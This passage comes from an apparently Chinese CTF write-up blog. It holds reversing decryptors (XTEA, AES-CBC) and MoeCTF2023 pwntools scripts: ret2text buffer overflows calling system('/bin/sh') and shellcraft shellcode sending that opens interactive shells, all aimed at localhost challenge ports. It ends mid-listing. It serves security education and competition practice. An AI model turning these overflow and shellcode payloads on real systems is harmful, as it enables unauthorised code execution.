flag[<span class="number">11</span>];</span><br><span class="line">    v15[<span class="number">0</span>] = <span class="number">0x2882D802120E</span>LL;</span><br><span class="line">    v15[<span class="number">1</span>] = <span class="number">0x28529A05954</span>LL;</span><br><span class="line">    v15[<span class="number">2</span>] = <span class="number">0x486088C03</span>LL;</span><br><span class="line">    v15[<span class="number">3</span>] = <span class="number">0xC0FB3B55754</span>LL;</span><br><span class="line">    v15[<span class="number">4</span>] = <span class="number">0xC2B9B7F8651</span>LL;</span><br><span class="line">    v15[<span class="number">5</span>] = <span class="number">0xAE83FB054C</span>LL;</span><br><span class="line">    v15[<span class="number">6</span>] = <span class="number">0x29ABF6DDCB15</span>LL;</span><br><span class="line">    v15[<span class="number">7</span>] = <span class="number">0x10E261FC807</span>LL;</span><br><span class="line">    v15[<span class="number">8</span>] = <span class="number">0x2A82FE86D707</span>LL;</span><br><span class="line">    v15[<span class="number">9</span>] = <span class="number">0xE0CB79A5706</span>LL;</span><br><span class="line">    v15[<span class="number">10</span>] = <span class="number">0x330560890D06</span>LL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// uint32_t f就是当前处理的4个字符---视为一个4字节的整数进行位操作</span></span><br><span class="line">    <span class="comment">// 下面的f[i-j]代表对f的i-j编号的二进制位进行处理</span></span><br><span class="line">    <span class="comment">// 例如f[0]代表最低的0位(最右边的位)</span></span><br><span class="line">    <span class="comment">// 操作完成后f就是局部的一段明文</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 同理,t就是密文</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// f[14-0] = t[14-0]</span></span><br><span class="line">    <span class="comment">// f[29-15] = t[29-15] ^ f[14-0]</span></span><br><span class="line">    <span class="comment">// f[31-30] = t[31-30] ^ f[16-15]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> t = v15[i];</span><br><span class="line">        <span class="type">uint32_t</span> f = <span class="number">0</span>;</span><br><span class="line">        f += t &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">        f += (((t &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x7FFF</span>) ^ (f &amp; <span class="number">0x7FFF</span>)) &lt;&lt; <span class="number">15</span>;</span><br><span class="line">        f += (((t &gt;&gt; <span class="number">30</span>) &amp; <span class="number">0x3</span>) ^ ((f &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x3</span>)) &lt;&lt; <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">        flag[i] = f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *p = (<span class="type">unsigned</span> <span class="type">char</span> *) flag;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">42</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        p[i] ^= p[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    std::<span class="built_in">reverse</span>((<span class="type">char</span>*)flag, (<span class="type">char</span>*)flag + <span class="number">44</span>); <span class="comment">// reverse 这个字符串</span></span><br><span class="line">    <span class="comment">// std::reverse(p, p + 43);</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025193234519.png" alt="image-20231025193234519" style="zoom:50%;" /><h2 id="ez-chal">ez_chal</h2><p>久远了,就存着个解密代码了.是个魔改XTEA:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">XTEA_encrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">XTEA_decryot</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">-0x61C88747</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">        v1 -= v0 ^ (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^</span><br><span class="line">              (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= v1 ^ (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v4[] = &#123;</span><br><span class="line">            <span class="number">156</span>, <span class="number">162</span>, <span class="number">158</span>, <span class="number">193</span>, <span class="number">135</span>, <span class="number">31</span>, <span class="number">9</span>, <span class="number">220</span>, <span class="number">59</span>, <span class="number">227</span>,</span><br><span class="line">            <span class="number">246</span>, <span class="number">145</span>, <span class="number">122</span>, <span class="number">92</span>, <span class="number">154</span>, <span class="number">246</span>, <span class="number">32</span>, <span class="number">159</span>, <span class="number">82</span>, <span class="number">147</span>,</span><br><span class="line">            <span class="number">225</span>, <span class="number">148</span>, <span class="number">91</span>, <span class="number">138</span>, <span class="number">155</span>, <span class="number">6</span>, <span class="number">29</span>, <span class="number">249</span>, <span class="number">64</span>, <span class="number">227</span>,</span><br><span class="line">            <span class="number">176</span>, <span class="number">35</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> key[] = &#123;</span><br><span class="line">            <span class="number">78</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">33</span>, <span class="number">78</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">119</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">33</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        XTEA_decryot(&amp;((<span class="type">uint32_t</span> *) v4)[<span class="number">2</span> * i], (<span class="type">uint32_t</span> *) key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, (<span class="type">char</span> *) v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="let-s-go">Let’s GO</h2><p>GO逆向,有一个反调试:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114204614556.png" alt="image-20231114204614556"></p><p>这里的异或操作是在生成真正的<code>iv</code>,用于后续的<code>AES加密</code>.</p><p>调试可得是将位于<code>0x3F56C0</code>的字符串<code>NewStar!NewStar!</code>进行依次异或.(实际上这个字符串是AES的key)</p><br><p>接下来真正的main中,<code>qword_436096</code>存储的就是密文,不过要根据这个十六进制字符串生成字节流才行.</p><p>不过这几行纯靠猜…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114204829077.png" alt="image-20231114204829077"></p><br><p>动调到ASE加密的函数这里,检查参数:<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114205117672.png" alt="image-20231114205117672" style="zoom:50%;" /></p><p>可以知道字符串<code>NewStar!NewStar!</code>就是使用到的key.</p><br><p>再后面这里看到是CBC模式,并且前面发现的那个反调试控制的异或操作对应的数组就是iv:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114205638886.png" alt="image-20231114205638886"></p><p>(这么看来前面那个<code>crypto_aes_NewCipher()</code>是初始化加密环境的函数)</p><p>现在为止已经分析清楚了,可以编写脚本了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># iv</span></span><br><span class="line">iv_original = [</span><br><span class="line">    <span class="number">78</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">33</span>, <span class="number">78</span>, <span class="number">101</span>,</span><br><span class="line">    <span class="number">119</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">33</span></span><br><span class="line">]</span><br><span class="line">iv = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> iv_original:</span><br><span class="line">    iv += <span class="built_in">chr</span>(i ^ <span class="number">0x32</span>)</span><br><span class="line">iv = iv.encode()</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key</span></span><br><span class="line">key = <span class="string">b&#x27;NewStar!NewStar!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enc</span></span><br><span class="line">enc_list = [</span><br><span class="line">    <span class="number">101</span>, <span class="number">101</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">52</span>, <span class="number">98</span>, <span class="number">49</span>, <span class="number">51</span>,</span><br><span class="line">    <span class="number">102</span>, <span class="number">102</span>, <span class="number">56</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">102</span>, <span class="number">56</span>, <span class="number">101</span>,</span><br><span class="line">    <span class="number">52</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">102</span>, <span class="number">53</span>, <span class="number">100</span>,</span><br><span class="line">    <span class="number">50</span>, <span class="number">53</span>, <span class="number">101</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">51</span>, <span class="number">97</span>, <span class="number">51</span>, <span class="number">102</span>, <span class="number">100</span>,</span><br><span class="line">    <span class="number">48</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">54</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">56</span>, <span class="number">56</span>,</span><br><span class="line">    <span class="number">99</span>, <span class="number">98</span>, <span class="number">55</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">98</span>, <span class="number">56</span>, <span class="number">98</span>, <span class="number">49</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">56</span>, <span class="number">99</span>, <span class="number">52</span>, <span class="number">52</span></span><br><span class="line">]</span><br><span class="line">enc = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> enc_list)</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt</span></span><br><span class="line">aes = AES.new(key, mode=AES.MODE_CBC, iv=iv)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(enc))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231114205849539.png" alt="image-20231114205849539" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp-MoeCTF2023</title>
      <link href="/2023-10-22-9c84791e243a/"/>
      <url>/2023-10-22-9c84791e243a/</url>
      
        <content type="html"><![CDATA[<p>比赛结束前就很长时间没打了,很多exp都删掉了…</p><p>贴一些自己还留着的exp…</p><h1 id="pwn">PWN</h1><h2 id="baby-calculator">baby_calculator</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;14721&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./canary1&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Now..start!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    line = p.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    line_list = line.decode().split(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    left = <span class="built_in">int</span>(line_list[<span class="number">0</span>])</span><br><span class="line">    right = <span class="built_in">int</span>(line_list[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    result = <span class="built_in">int</span>(line_list[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> left + right == result:</span><br><span class="line">        p.sendline(<span class="string">&#x27;BlackBird&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;WingS&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="int-overflow">int_overflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;string.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;bits/stdc++.h&gt;</span></span><br><span class="line"><span class="comment">// #include &quot;all.h&quot;</span></span><br><span class="line"><span class="comment">//在linux下执行!!!</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i = ~(<span class="number">1</span> &lt;&lt; <span class="number">31</span>); <span class="comment">//2147483647</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">i = <span class="number">1</span> &lt;&lt; <span class="number">31</span>; <span class="comment">//-2147483648</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"><span class="type">char</span> str[] = <span class="string">&quot;4294852782&quot;</span>;<span class="comment">//2147483647+(-114514-(-2147483648))+1</span></span><br><span class="line"><span class="comment">//别问我为啥这么算</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, atoi(str));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ret2text-32">ret2text_32</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">12933</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./canary1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常规的跳转到system</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x58</span></span><br><span class="line">_system = <span class="number">0x08049070</span></span><br><span class="line">bin_sh = <span class="number">0x0804C02C</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (offset + <span class="number">4</span>) + p32(_system) + p32(<span class="number">1</span>) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ret2text-64">ret2text_64</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2071</span>)</span><br><span class="line"><span class="comment"># p = gdb.debug(&quot;./pwn&quot;, &quot;b *(vuln)&quot;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># 偏移就是0x50...不是0x54</span></span><br><span class="line">offset = <span class="number">0x50</span> + <span class="number">8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4011be</span></span><br><span class="line">_system = <span class="number">0x401090</span></span><br><span class="line">bin_sh = <span class="number">0x404050</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(_system)</span><br><span class="line"><span class="comment"># 注意这里需要一个ret来堆栈平衡---坑点</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># print(str(len(payload)))</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="shellcode-level0">shellcode_level0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#必须加,不然生成的shellcode是32位的</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># p = gdb.debug(&quot;./shellcode_level0&quot;, &quot;main&quot;)</span></span><br><span class="line"><span class="comment"># p= process(&quot;./shellcode_level0&quot;)</span></span><br><span class="line"><span class="comment"># 在linux下执行!</span></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">46277</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset = 0x80</span></span><br><span class="line">shellcode_addr = <span class="number">0x7ffdfdaf2ab0</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># payload = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="shellcode-level1">shellcode_level1</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#必须加,不然生成的shellcode是32位的</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># p = gdb.debug(&quot;./shellcode_level0&quot;, &quot;main&quot;)</span></span><br><span class="line"><span class="comment"># p= process(&quot;./shellcode_level0&quot;)</span></span><br><span class="line"><span class="comment"># 在linux下执行!</span></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">46277</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># payload = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 貌似过了?</span></span><br></pre></td></tr></table></figure><h1 id="reverse">Reverse</h1><h2 id="equation">EQUATION</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span 